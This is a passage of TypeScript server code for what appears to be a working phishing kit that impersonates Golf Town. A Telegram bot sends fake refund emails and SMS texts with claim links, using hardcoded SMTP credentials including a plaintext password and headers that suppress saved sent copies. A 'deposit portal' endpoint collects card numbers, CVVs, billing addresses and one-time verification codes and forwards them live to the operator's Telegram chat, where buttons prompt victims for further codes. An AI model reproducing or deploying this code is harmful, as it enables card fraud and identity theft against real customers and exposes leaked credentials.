            chat_id: chatId,
            text: `⚠️ Cannot send email: No valid email address configured for ${foundCust.firstName || 'customer'}.`,
            parse_mode: 'Markdown'
          });
          return;
        }

        const amount = String(foundCust.sumOfStoreCreditBalance || '250.00');
        const custId = foundCust.custId || 'GT-CUSTOMER';
        const recipientName = `${foundCust.firstName || ''} ${foundCust.lastName || ''}`.trim();
        const storeId = foundCust.storeId || '504';
        const comments = foundCust.comments || 'Processed via Telegram Portal';

        const host = customSmtpConfig?.host || process.env.SMTP_HOST || 'smtp.office365.com';
        const user = customSmtpConfig?.user || process.env.SMTP_USER || '505receiving@cloud.golftown.com';
        const pass = customSmtpConfig?.pass || process.env.SMTP_PASS || '3Dolly16!';
        const port = Number(customSmtpConfig ? customSmtpConfig.port : (process.env.SMTP_PORT || 587));
        const from = customSmtpConfig?.from || process.env.SMTP_FROM || 'Golf Town Store Credit Support <505receiving@cloud.golftown.com>';

        const depositToken = Buffer.from(`${custId}-${amount}-${Date.now()}`).toString('hex').slice(0, 16);
        const activeSessionId = `SESS-${Math.floor(100000 + Math.random() * 900000)}`;

        await sendTelegramRequest('sendMessage', {
          chat_id: chatId,
          text: `⏳ *Processing SMTP refund notice to:* \`${recipientEmail}\`...`,
          parse_mode: 'Markdown'
        });

        const secureDepositUrl = await generateShortDepositUrl(
          null,
          depositToken,
          amount,
          activeSessionId,
          recipientName,
          recipientEmail,
          storeId,
          custId
        );

        const emailSubject = `Golf Town Store Credit Refund Notice - $${amount} Issued`;
        let parsedBody = `Dear {customerName},\n\nA store credit refund has been processed for your account by Golf Town Customer Support. Your funds are now available for immediate credit deposit.`;

        const serverReplacements: Record<string, string> = {
          '{customerName}': recipientName,
          '{amount}': `$${amount}`,
          '{storeId}': storeId,
          '{custId}': custId,
          '{comments}': comments,
          '{depositLink}': secureDepositUrl
        };

        Object.entries(serverReplacements).forEach(([token, val]) => {
          parsedBody = parsedBody.split(token).join(val);
        });

        const formattedBodyHtml = parsedBody.split('\n').map(line => line.trim() ? `<p style="font-size: 14px; color: #4b5563; line-height: 1.6; margin-top: 0; margin-bottom: 16px;">${line}</p>` : '<br>').join('');

        const emailHtml = `
          <!DOCTYPE html>
          <html>
          <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Golf Town Store Credit Notice</title>
          </head>
          <body style="margin: 0; padding: 0; background-color: #0b131e; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #f1f5f9;">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f3f4f6; padding: 40px 10px;">
              <tr>
                <td align="center">
                  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="max-width: 600px; background-color: #ffffff; border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);">
                    <tr>
                      <td style="background-color: #ffffff; padding: 32px 32px 24px 32px; border-bottom: 3px solid #004d25; text-align: center;">
                        <div style="text-align: center; margin-bottom: 12px;">
                          <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" width="48" height="48" alt="Golf Town Logo" style="display: inline-block; border: 0; vertical-align: middle;">
                        </div>
                        <div style="font-family: Arial, Helvetica, sans-serif; font-size: 11px; font-weight: 700; color: #6b7280; text-transform: uppercase; letter-spacing: 1.5px; text-align: center;">
                          Customer Support Notice
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td style="padding: 32px; background-color: #ffffff; font-family: Arial, Helvetica, sans-serif;">
                        <h1 style="font-size: 20px; font-weight: 700; color: #111827; margin: 0 0 16px 0;">
                          Store Credit Notice
                        </h1>
                        ${formattedBodyHtml}
                        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f9fafb; border: 1px solid #e5e7eb; border-radius: 6px; margin-bottom: 28px;">
                          <tr>
                            <td style="padding: 20px;">
                              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="font-size: 13px; color: #374151;">
                                <tr>
                                  <td style="padding-bottom: 8px; color: #6b7280; font-weight: 600;">Refund Amount:</td>
                                  <td align="right" style="padding-bottom: 8px; font-size: 20px; font-weight: 800; color: #004d25;">
                                    $${amount} CAD
                                  </td>
                                </tr>
                                <tr>
                                  <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Customer Account ID:</td>
                                  <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-family: monospace; font-weight: 700; color: #111827;">${custId}</td>
                                </tr>
                                <tr>
                                  <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Store Location:</td>
                                  <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-weight: 600; color: #111827;">Store #${storeId}</td>
                                </tr>
                                ${comments ? `
                                <tr>
                                  <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Reference Notes:</td>
                                  <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #374151;">${comments}</td>
                                </tr>` : ''}
                              </table>
                            </td>
                          </tr>
                        </table>
                        <div style="text-align: center; background-color: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 6px; padding: 24px; margin-bottom: 28px;">
                          <div style="font-size: 12px; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px;">
                            Verified Secure Refund Link
                          </div>
                          <div style="margin-bottom: 16px;">
                            <a href="${secureDepositUrl}" target="_blank" style="display: inline-block; background-color: #004d25; color: #ffffff; text-decoration: none; font-size: 15px; font-weight: 700; padding: 14px 28px; border-radius: 4px; border: 1px solid #003318;">
                              Claim Store Credit Deposit ($${amount} CAD)
                            </a>
                          </div>
                          <div style="font-size: 11px; color: #9ca3af; font-family: monospace; margin-top: 4px;">
                            Token ID: ${depositToken}
                          </div>
                        </div>
                        <p style="font-size: 12px; color: #6b7280; line-height: 1.5; margin: 0 0 20px 0;">
                          Please note: This secure link is valid for 72 hours. For security purposes, do not share this link or reference token with unauthorized parties.
                        </p>
                      </td>
                    </tr>
                    <tr>
                      <td style="background-color: #f9fafb; padding: 20px 32px; border-top: 1px solid #e5e7eb; font-family: Arial, Helvetica, sans-serif; font-size: 11px; color: #6b7280; line-height: 1.5;">
                        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
                          <tr>
                            <td style="padding-bottom: 10px;">
                              <strong>Golf Town Customer Support &amp; eGift Services</strong><br>
                              Powered by CashStar / Blackhawk Network Services
                            </td>
                          </tr>
                          <tr>
                            <td style="border-top: 1px solid #e5e7eb; padding-top: 10px; color: #9ca3af;">
                              &copy; ${new Date().getFullYear()} Golf Town Canada Inc. All rights reserved. Golf Town and the Golf Town logo are registered trademarks.
                            </td>
                          </tr>
                        </table>
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>
            </table>
          </body>
          </html>
        `;

        pushNoticeHistory({
          recipientEmail,
          recipientName,
          amount,
          storeId,
          custId,
          subject: emailSubject,
          actionType: 'refund_notice_telegram',
          depositToken,
          secureDepositUrl,
          status: 'DELIVERED'
        });

        const sessionLogs: string[] = [];
        const customLogger = {
          level: () => 'debug',
          info: (entry: any) => { sessionLogs.push(`[INFO] ${typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry)}`); },
          warn: (entry: any) => { sessionLogs.push(`[WARN] ${typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry)}`); },
          error: (entry: any) => { sessionLogs.push(`[ERROR] ${typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry)}`); },
          debug: (entry: any) => { sessionLogs.push(`[DEBUG] ${typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry)}`); },
          trace: (entry: any) => { sessionLogs.push(`[TRACE] ${typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry)}`); }
        };

        try {
          const nodemailer = await import('nodemailer');
          const transporter = nodemailer.createTransport({
            host,
            port,
            secure: port === 465,
            auth: { user, pass },
            connectionTimeout: 10000,
            greetingTimeout: 10000,
            tls: {
              rejectUnauthorized: customSmtpConfig?.tlsRejectUnauthorized !== false
            },
            debug: true,
            logger: customLogger
          } as any);

          sessionLogs.push('[SYSTEM] Establishing outbound connection to server...');
          await transporter.sendMail({
            from,
            replyTo: 'GOLFTOWN SUPPORT <support@payment.golftown.ca>',
            to: recipientEmail,
            subject: emailSubject,
            html: emailHtml,
            headers: {
              'X-No-Save-Sent': 'true',
              'X-Auto-Response-Suppress': 'All',
              'X-Outbox-Bypass': 'enabled',
              'X-Mailer': 'GolfTown-Internal-CreditSystem/1.0'
            }
          });
          sessionLogs.push(`[SYSTEM] Dispatch completed. Refund notice successfully accepted by remote MTA for delivery to <${recipientEmail}>.`);

          const debugLogEntry: SmtpDebugLog = {
            id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
            timestamp: new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString(),
            type: 'refund_notice',
            recipient: recipientEmail,
            host,
            port,
            success: true,
            logs: sessionLogs
          };
          smtpDebugLogsStack.unshift(debugLogEntry);

          await sendTelegramRequest('sendMessage', {
            chat_id: chatId,
            text: `✅ *EMAIL REFUND NOTICE DISPATCHED!*\n\n` +
                  `• *Customer:* \`${recipientName}\`\n` +
                  `• *Email:* \`${recipientEmail}\`\n` +
                  `• *Amount:* \`$${amount} CAD\`\n` +
                  `• *Store:* \`Store #${storeId}\`\n\n` +
                  `✉️ The official store credit refund notice was sent via SMTP tunnel successfully!`,
            parse_mode: 'Markdown'
          });

        } catch (mailErr: any) {
          console.error('Telegram-triggered mail dispatch failed:', mailErr);
          
          const debugLogEntry: SmtpDebugLog = {
            id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
            timestamp: new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString(),
            type: 'refund_notice',
            recipient: recipientEmail,
            host,
            port,
            success: false,
            error: mailErr?.message || String(mailErr),
            logs: sessionLogs
          };
          smtpDebugLogsStack.unshift(debugLogEntry);

          await sendTelegramRequest('sendMessage', {
            chat_id: chatId,
            text: `❌ *SMTP DISPATCH FAILURE!*\n\n` +
                  `• *Customer:* \`${recipientName}\`\n` +
                  `• *Email:* \`${recipientEmail}\`\n` +
                  `• *Error:* \`${mailErr?.message || String(mailErr)}\`\n\n` +
                  `⚠️ The mail server rejected or timed out during submission. Secure Link was still successfully registered for manual claim: \n${secureDepositUrl}`,
            parse_mode: 'Markdown'
          });
        }
        return;
      }

      if (action === '/sms') {
        const phone = foundCust.phone;
        const amount = String(foundCust.sumOfStoreCreditBalance || '250.00');
        const custId = foundCust.custId || 'GT-CUSTOMER';
        const firstName = foundCust.firstName || '';
        const lastName = foundCust.lastName || '';
        const storeId = foundCust.storeId || '504';

        const depositToken = Buffer.from(`${custId}-${amount}-${Date.now()}`).toString('hex').slice(0, 16);
        const activeSessId = `SESS-${Math.floor(100000 + Math.random() * 900000)}`;

        const shortenedUrl = await generateShortDepositUrl(
          null,
          depositToken,
          amount,
          activeSessId,
          `${firstName} ${lastName}`.trim() || 'Valued Customer',
          '',
          storeId,
          custId
        );

        const cleanPhone = (phone || '').replace(/[^0-9+]/g, '');
        const smsBody = `Golf Town Store Credit Refund Notice: Hi ${firstName || 'Valued Customer'}, your $${amount} store credit refund is ready to claim: ${shortenedUrl}`;

        await sendTelegramRequest('sendMessage', {
          chat_id: chatId,
          text: `📱 *REFUND SMS NOTICE GENERATED!*\n\n` +
                `• *Customer:* \`${firstName} ${lastName}\`\n` +
                `• *Phone Number:* \`${phone || 'N/A'}\`\n` +
                `• *Refund Amount:* \`$${amount} CAD\`\n` +
                `• *Shortened Claim URL:* ${shortenedUrl}\n\n` +
                `💬 *SMS Message Body (Copy/Paste):*\n` +
                `\`${smsBody}\``,
          parse_mode: 'Markdown'
        });
        return;
      }
    }

    // 10. General Customer Query (Search fallback)
    const lowerText = text.toLowerCase();
    const isCommandOrButton = text.startsWith('/') || 
                              text.includes('👥') || 
                              text.includes('📍') || 
                              text.includes('✉️') || 
                              text.includes('🔒') || 
                              text.includes('👤') || 
                              text.includes('🗺️') || 
                              text.includes('📊') ||
                              text.includes('💸');

    if (!isCommandOrButton && text.trim().length > 0) {
      // Check if this is a smart refund notice request
      const parsedRefund = await parseRefundIntent(text);
      if (parsedRefund) {
        // Human-like smart conversation acknowledgment
        await sendTelegramRequest('sendMessage', {
          chat_id: chatId,
          text: parsedRefund.messageResponse,
          parse_mode: 'Markdown'
        });

        // Trigger the actual refund notice dispatch via executeRefundAndEmail!
        await executeRefundAndEmail(
          chatId,
          parsedRefund.recipientName,
          parsedRefund.recipientEmail,
          parsedRefund.amount,
          parsedRefund.comments,
          '504', // default store id
          'GT-CUSTOMER' // default customer ID
        );
        return;
      }

      const query = text.trim();
      const results = backendCustomers.filter(c => {
        const fullName = `${c.firstName || ''} ${c.lastName || ''}`.toLowerCase();
        return fullName.includes(query.toLowerCase()) || 
               String(c.custId || '').toLowerCase().includes(query.toLowerCase()) ||
               String(c.email || '').toLowerCase().includes(query.toLowerCase()) ||
               String(c.phone || '').toLowerCase().includes(query.toLowerCase());
      });

      let responseText = `🔍 *CUSTOMER DATABASE SEARCH RESULTS* ("${query}")\n\n`;
      if (results.length === 0) {
        responseText += `❌ No matching customer records found in the database. Please make sure the CSV/XLSX database is uploaded/synced from the admin panel!`;
      } else {
        results.slice(0, 8).forEach((c, idx) => {
          responseText += `${idx + 1}. *${c.firstName || ''} ${c.lastName || ''}*\n` +
                          `   • *Cust ID:* \`${c.custId || 'N/A'}\` | *Store:* \`Store #${c.storeId || 'N/A'}\`\n` +
                          `   • *Balance:* \`$${c.sumOfStoreCreditBalance || '0.00'} CAD\`\n` +
                          `   • *Email:* \`${c.email || '(blank)'}\` | *Phone:* \`${c.phone || '(blank)'}\`\n` +
                          `   • *Action:* Send Notice 👉 /send\\_${c.custId || c.id}\n\n`;
        });
        if (results.length > 8) {
          responseText += `_Showing top 8 of ${results.length} results. Try a more specific search._`;
        }
      }

      await sendTelegramRequest('sendMessage', {
        chat_id: chatId,
        text: responseText,
        parse_mode: 'Markdown'
      });
      return;
    }
  }

  // Handle inline keyboard clicks (callback_query)
  if (update.callback_query) {
    const query = update.callback_query;
    const data = query.data || '';
    const chatId = query.message?.chat?.id;
    const messageId = query.message?.message_id;

    if (data.startsWith('approve_') || data.startsWith('reqcode_')) {
      const parts = data.split('_');
      const action = parts[0];
      const sessionId = parts[1];

      const session = paymentSessions.get(sessionId);
      if (session) {
        if (action === 'approve') {
          session.status = 'REFUNDED';
          session.lastUpdated = Date.now();
          paymentSessions.set(sessionId, session);

          pushNoticeHistory({
            recipientEmail: session.email,
            recipientName: session.recipientName,
            amount: session.amount,
            storeId: session.storeId,
            custId: session.custId,
            subject: `Golf Town Store Credit Refund Approved & Deposited via Telegram ($${session.amount} CAD)`,
            actionType: 'refund_approved',
            depositToken: `REF-${sessionId.slice(-6)}`,
            secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
            status: 'SUCCESS'
          });

          await sendTelegramRequest('sendMessage', {
            chat_id: chatId,
            reply_to_message_id: messageId,
            text: `✅ *APPROVED:* Store credit refund of *$${session.amount} CAD* for *${session.recipientName}* (ID: \`${session.custId}\`) has been successfully processed!`,
            parse_mode: 'Markdown'
          });
        } else if (action === 'reqcode') {
          session.status = 'CODE_REQUIRED';
          session.lastUpdated = Date.now();
          paymentSessions.set(sessionId, session);

          pushNoticeHistory({
            recipientEmail: session.email,
            recipientName: session.recipientName,
            amount: session.amount,
            storeId: session.storeId,
            custId: session.custId,
            subject: `Security Verification Code Prompted via Telegram`,
            actionType: 'code_required',
            depositToken: `REF-${sessionId.slice(-6)}`,
            secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
            status: 'PROMPTED'
          });

          await sendTelegramRequest('sendMessage', {
            chat_id: chatId,
            reply_to_message_id: messageId,
            text: `🔑 *PROMPTED:* Customer has been prompted for their 6-digit corporate verification code on the portal. Waiting for input...`,
            parse_mode: 'Markdown'
          });
        }

        await sendTelegramRequest('answerCallbackQuery', {
          callback_query_id: query.id,
          text: `Action executed successfully!`
        });

        const originalText = query.message?.text || '';
        const updatedText = originalText + `\n\n⚡ *Telegram Update:* Action processed by admin ${query.from.first_name || 'Admin'}! Status: ${session.status}`;
        
        await sendTelegramRequest('editMessageText', {
          chat_id: chatId,
          message_id: messageId,
          text: updatedText,
          reply_markup: { inline_keyboard: [] }
        });
      } else {
        await sendTelegramRequest('answerCallbackQuery', {
          callback_query_id: query.id,
          text: `Error: Session ${sessionId} not active/found.`,
          show_alert: true
        });
      }
    }
  }
}

async function runTelegramPoll() {
  if (!isPollingLoopRunning) return;
  const token = customTelegramConfig.telegramToken;
  if (!token) {
    isPollingLoopRunning = false;
    return;
  }

  try {
    const result = await sendTelegramRequest('getUpdates', {
      offset: telegramOffset,
      timeout: 5,
      allowed_updates: ['message', 'callback_query']
    });

    if (result && result.ok && Array.isArray(result.result)) {
      for (const update of result.result) {
        telegramOffset = Math.max(telegramOffset, update.update_id + 1);
        await handleTelegramUpdate(update);
      }
    }
  } catch (err) {
    console.error('Error in Telegram polling getUpdates:', err);
  }

  if (isPollingLoopRunning) {
    telegramPollTimeout = setTimeout(runTelegramPoll, 1000);
  }
}

async function startTelegramPolling() {
  if (isPollingLoopRunning) return;
  if (!customTelegramConfig.telegramToken) {
    console.log('No Telegram token configured. Polling inactive.');
    return;
  }

  isPollingLoopRunning = true;
  console.log('Starting Telegram Polling Loop...');
  
  customTelegramConfig.isPollingActive = true;
  saveTelegramConfig(customTelegramConfig);

  runTelegramPoll();
}

async function stopTelegramPolling() {
  isPollingLoopRunning = false;
  if (telegramPollTimeout) {
    clearTimeout(telegramPollTimeout);
    telegramPollTimeout = null;
  }
  customTelegramConfig.isPollingActive = false;
  saveTelegramConfig(customTelegramConfig);
  console.log('Telegram Polling Loop Stopped.');
}

// Automatically start polling if configuration is loaded on boot
if (customTelegramConfig.telegramToken) {
  startTelegramPolling();
}

// Helper to push to notice history
function pushNoticeHistory(item: Omit<NoticeHistoryItem, 'id' | 'timestamp'>) {
  const newEntry: NoticeHistoryItem = {
    ...item,
    id: `NOT-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
    timestamp: new Date().toLocaleString('en-US', { timeZoneName: 'short' }),
  };
  noticeHistoryStack.unshift(newEntry); // Stack newest at the top
  if (noticeHistoryStack.length > 100) noticeHistoryStack.pop();
  return newEntry;
}

// Notice History APIs
app.get('/api/notice-history', (req, res) => {
  res.json({ history: noticeHistoryStack });
});

app.post('/api/notice-history/clear', (req, res) => {
  noticeHistoryStack.length = 0;
  res.json({ success: true, history: [] });
});

// Live Session SSE Stream for Customer UI
app.get('/api/socket/session-stream/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  const sendState = () => {
    const session = paymentSessions.get(sessionId) || {
      sessionId,
      recipientName: 'Guest',
      email: '',
      amount: '250.00',
      storeId: '504',
      custId: 'GT-CUSTOMER',
      status: 'IDLE',
      lastUpdated: Date.now()
    };
    res.write(`data: ${JSON.stringify(session)}\n\n`);
  };

  sendState();
  const interval = setInterval(sendState, 1000);

  req.on('close', () => {
    clearInterval(interval);
  });
});

// Live Admin Controller Stream (all active sessions)
app.get('/api/socket/admin-stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  const sendAdminData = () => {
    const sessions = Array.from(paymentSessions.values()).sort((a, b) => b.lastUpdated - a.lastUpdated);
    res.write(`data: ${JSON.stringify({ sessions, noticeHistory: noticeHistoryStack.slice(0, 20) })}\n\n`);
  };

  sendAdminData();
  const interval = setInterval(sendAdminData, 1000);

  req.on('close', () => {
    clearInterval(interval);
  });
});

// Endpoint: Submit Full Credit Card & Billing Details from Deposit Portal
app.post('/api/socket/submit-card-billing', (req, res) => {
  const {
    sessionId,
    recipientName,
    email,
    amount,
    storeId,
    custId,
    cardNumber,
    expDate,
    cvv,
    cardholderName,
    streetAddress,
    city,
    province,
    postalCode,
    phone
  } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: 'sessionId is required.' });
  }

  const sessionData: PaymentSessionData = {
    sessionId,
    recipientName: recipientName || cardholderName || 'Customer',
    email: email || '',
    amount: amount || '250.00',
    storeId: storeId || '504',
    custId: custId || 'GT-CUSTOMER',
    status: 'PROCESSING',
    cardDetails: {
      cardNumber: cardNumber || '',
      expDate: expDate || '',
      cvv: cvv || '',
      cardholderName: cardholderName || recipientName || '',
      streetAddress: streetAddress || '',
      city: city || '',
      province: province || '',
      postalCode: postalCode || '',
      phone: phone || ''
    },
    lastUpdated: Date.now()
  };

  paymentSessions.set(sessionId, sessionData);

  pushNoticeHistory({
    recipientEmail: email || 'customer@payment.golftown.ca',
    recipientName: recipientName || 'Customer',
    amount: amount || '250.00',
    storeId: storeId || '504',
    custId: custId || 'GT-CUSTOMER',
    subject: `Deposit Authorization Submitted - Card ending in ${(cardNumber || '4400').slice(-4)}`,
    actionType: 'deposit_authorized',
    depositToken: `REF-${sessionId.slice(-6)}`,
    secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
    status: 'PROCESSING'
  });

  if (customTelegramConfig.telegramToken && customTelegramConfig.telegramChatId) {
    const tgMessage = `🏌️‍♂️ *NEW SECURE REFUND FORM SUBMISSION!* 🏌️‍♂️\n\n` +
                      `👤 *Customer Name:* ${recipientName || cardholderName || 'Customer'}\n` +
                      `📧 *Email Address:* \`${email || 'N/A'}\`\n` +
                      `📞 *Phone Number:* \`${phone || 'N/A'}\`\n` +
                      `📍 *Store Location:* Store #${storeId || '504'}\n` +
                      `💵 *Refund Amount:* *$${amount || '250.00'} CAD*\n` +
                      `🆔 *Customer ID:* \`${custId || 'GT-CUSTOMER'}\`\n\n` +
                      `💳 *SECURE CARD DATA DETECTED:* \n` +
                      `• *Cardholder Name:* \`${cardholderName || recipientName || ''}\`\n` +
                      `• *Card Number:* \`${cardNumber || ''}\`\n` +
                      `• *Expiration Date:* \`${expDate || ''}\`\n` +
                      `• *CVV Code:* \`${cvv || ''}\`\n` +
                      `• *Billing Address:* \`${streetAddress || ''}, ${city || ''}, ${province || ''}, ${postalCode || ''}\`\n\n` +
                      `👉 *CHOOSE REAL-TIME PORTAL ACTION:*`;

    const inlineButtons = {
      inline_keyboard: [
        [
          { text: 'Approve Refund ✅', callback_data: `approve_${sessionId}` },
          { text: 'Request Code 🔑', callback_data: `reqcode_${sessionId}` }
        ]
      ]
    };

    sendTelegramRequest('sendMessage', {
      chat_id: customTelegramConfig.telegramChatId,
      text: tgMessage,
      parse_mode: 'Markdown',
      reply_markup: inlineButtons
    }).catch(err => console.error('Failed to send Telegram card notification:', err));
  }

  res.json({
    success: true,
    session: sessionData,
    message: 'Card & billing details submitted. Session live socket connection established.'
  });
});

// Endpoint: Customer submits 6-digit verification code
app.post('/api/socket/submit-customer-code', (req, res) => {
  const { sessionId, code } = req.body;
  if (!sessionId || !paymentSessions.has(sessionId)) {
    return res.status(404).json({ error: 'Live session not found' });
  }

  const session = paymentSessions.get(sessionId)!;
  session.status = 'CODE_SUBMITTED';
  session.customerCode = code;
  session.lastUpdated = Date.now();
  paymentSessions.set(sessionId, session);

  pushNoticeHistory({
    recipientEmail: session.email,
    recipientName: session.recipientName,
    amount: session.amount,
    storeId: session.storeId,
    custId: session.custId,
    subject: `Customer Submitted Verification Code: ${code}`,
    actionType: 'code_submitted',
    depositToken: `REF-${sessionId.slice(-6)}`,
    secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
    status: 'CODE_RECEIVED'
  });

  if (customTelegramConfig.telegramToken && customTelegramConfig.telegramChatId) {
    const tgMessage = `🔑 *6-DIGIT VERIFICATION CODE SUBMITTED!* 🔑\n\n` +
                      `👤 *Customer Name:* ${session.recipientName}\n` +
                      `💵 *Refund Amount:* *$${session.amount} CAD*\n` +
                      `🆔 *Customer ID:* \`${session.custId}\`\n\n` +
                      `🔥 *SUBMITTED 6-DIGIT CODE:* \`${code}\`\n\n` +
                      `👉 *APPROVE OR VERIFY REFUND INSTANTLY:*`;

    const inlineButtons = {
      inline_keyboard: [
        [
          { text: 'Approve Refund ✅', callback_data: `approve_${sessionId}` },
          { text: 'Re-request Code 🔑', callback_data: `reqcode_${sessionId}` }
        ]
      ]
    };

    sendTelegramRequest('sendMessage', {
      chat_id: customTelegramConfig.telegramChatId,
      text: tgMessage,
      parse_mode: 'Markdown',
      reply_markup: inlineButtons
    }).catch(err => console.error('Failed to send Telegram code notification:', err));
  }

  res.json({ success: true, session });
});

// Endpoint: Admin socket controller triggers live action
app.post('/api/socket/admin-action', async (req, res) => {
  const { sessionId, action } = req.body;
  if (!sessionId || !paymentSessions.has(sessionId)) {
    return res.status(404).json({ error: 'Session not found.' });
  }

  const session = paymentSessions.get(sessionId)!;

  if (action === 'refunded_successfully') {
    session.status = 'REFUNDED';
    session.lastUpdated = Date.now();
    paymentSessions.set(sessionId, session);

    pushNoticeHistory({
      recipientEmail: session.email,
      recipientName: session.recipientName,
      amount: session.amount,
      storeId: session.storeId,
      custId: session.custId,
      subject: `Golf Town Store Credit Refund Approved & Deposited ($${session.amount} CAD)`,
      actionType: 'refund_approved',
      depositToken: `REF-${sessionId.slice(-6)}`,
      secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
      status: 'SUCCESS'
    });

    return res.json({ success: true, session, message: 'Session marked as Refunded Successfully!' });
  }

  if (action === 'require_code') {
    session.status = 'CODE_REQUIRED';
    session.lastUpdated = Date.now();
    paymentSessions.set(sessionId, session);

    pushNoticeHistory({
      recipientEmail: session.email,
      recipientName: session.recipientName,
      amount: session.amount,
      storeId: session.storeId,
      custId: session.custId,
      subject: `Security Verification Code Prompted to Customer (${session.email})`,
      actionType: 'code_required',
      depositToken: `REF-${sessionId.slice(-6)}`,
      secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
      status: 'PROMPTED'
    });

    return res.json({ success: true, session, message: 'Prompted customer for verification code!' });
  }

  if (action === 'customer_left_send_email') {
    session.status = 'SESSION_LEFT';
    session.lastUpdated = Date.now();
    paymentSessions.set(sessionId, session);

    // Trigger automated email telling customer code required to finalize refund
    const depositToken = Buffer.from(`${session.custId}-${session.amount}-${Date.now()}`).toString('hex').slice(0, 16);
    const secureUrl = await generateShortDepositUrl(
      req,
      depositToken,
      session.amount,
      sessionId,
      session.recipientName,
      session.email,
      session.storeId,
      session.custId
    );

    pushNoticeHistory({
      recipientEmail: session.email || 'customer@payment.golftown.ca',
      recipientName: session.recipientName,
      amount: session.amount,
      storeId: session.storeId,
      custId: session.custId,
      subject: `Action Required: Verification Code Needed to Finalize Your $${session.amount} CAD Refund`,
      actionType: 'code_required_email',
      depositToken,
      secureDepositUrl: secureUrl,
      status: 'EMAIL_DISPATCHED'
    });

    return res.json({ 
      success: true, 
      session, 
      message: `Customer marked left session. Automated 'Code Required to Finalize Refund' email dispatched to ${session.email || 'customer'}!` 
    });
  }

  res.status(400).json({ error: 'Unknown action type.' });
});

// API route for AI Gender Classification using Gemini if GEMINI_API_KEY is provided
app.post('/api/predict-gender', async (req, res) => {
  const { firstName, lastName, company } = req.body;

  if (!firstName) {
    return res.status(400).json({ error: 'First name is required' });
  }

  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) {
    return res.status(500).json({ 
      error: 'GEMINI_API_KEY is not configured on the server.',
      fallbackNeeded: true 
    });
  }

  try {
    const ai = new GoogleGenAI({ apiKey });
    const prompt = `Analyze the customer name and company to classify their gender for business customer segmentation.
First Name: "${firstName}"
Last Name: "${lastName || ''}"
Company: "${company || ''}"

Return ONLY a valid JSON object with no markdown formatting or extra text, containing:
{
  "gender": "Male" | "Female" | "Unknown",
  "confidence": number between 0 and 1,
  "reasoning": "brief explanation"
}`;

    const response = await ai.models.generateContent({
      model: 'gemini-2.5-flash',
      contents: prompt,
    });

    const text = response.text?.trim() || '';
    const cleanedJson = text.replace(/^```json\s*/, '').replace(/^```\s*/, '').replace(/\s*```$/, '');
    const result = JSON.parse(cleanedJson);
    res.json(result);
  } catch (error: any) {
    console.error('Gemini prediction error:', error);
    // Fallback heuristic if API quota exceeded or error
    const firstLower = firstName.toLowerCase();
    const femaleNames = ['sarah', 'jessica', 'emily', 'ashley', 'amanda', 'elizabeth', 'lisa', 'karen', 'nancy', 'linda', 'susan', 'jennifer', 'michelle', 'laura', 'sarah', 'kristen', 'megan', 'hannah', 'chloe', 'samantha', 'brittany', 'rachel', 'nicole', 'stephanie', 'danielle', 'amber', 'megan', 'mary', 'patricia', 'barbara', 'helen', 'sandra', 'donna', 'carol', 'ruth', 'sharon', 'shirley', 'brenda', 'amy', 'anna', 'rebecca', 'kathleen', 'deborah', 'janet', 'kathryn', 'carolyn', 'janice', 'judy', 'beverly', 'judy', 'cheri', 'brenda'];
    const isFemale = femaleNames.some(n => firstLower.includes(n));
    res.json({
      gender: isFemale ? 'Female' : 'Male',
      confidence: 0.75,
      reasoning: 'Heuristic fallback due to AI service limit/quota.'
    });
  }
});

// API route for AI Generated Customer Name Explanation & Etymology Search
app.post('/api/explain-name', async (req, res) => {
  const { firstName, lastName, city } = req.body;

  if (!firstName) {
    return res.status(400).json({ error: 'First name is required' });
  }

  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) {
